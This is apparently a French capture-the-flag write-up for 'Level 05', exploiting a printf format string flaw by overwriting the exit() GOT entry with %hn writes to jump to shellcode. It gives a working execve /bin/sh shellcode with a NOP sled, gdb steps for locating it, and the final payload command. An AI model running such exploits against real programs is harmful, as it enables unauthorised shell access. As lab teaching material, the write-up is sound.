## Level 05

### Analyse

Le binaire utilise fgets pour lire une entrée utilisateur de 100 octets, puis l'affiche directement via printf(buffer) au lieu de printf("%s", buffer).

Le programme contient une boucle qui transforme les caractères majuscules (0x40 à 0x5a) en minuscules.Si une adresse injectée contient un de ces octets, elle sera corrompue avant l'appel à printf.
on trouve l'offset de la pile AAAA %p %p %p %p %p %p.
l'adresse de exit objdump -R ./level05
Puisque le programme appelle exit() juste après le printf, nous allons détourner cet appel pour sauter sur notre shellcode.

### Exploitation

On place le shellcode dans une variable d'environnement avec un NOP Sled (suite de \x90) pour stabiliser l'exploitation.
export MY_SHELL=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

Il faut trouver l'adresse de MY_SHELL en conditions réelles d'exécution.
gdb ./override_5
(gdb) b *main
(gdb) run
(gdb) p (char *) getenv("MY_SHELL")
On utilise le spécificateur %hn pour écrire 2 octets par 2 octets. Cela évite d'afficher des milliards de caractères et de faire crash le programme.

(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56249c%10$hn" + "%9278c%11$hn"'; cat) | ./level05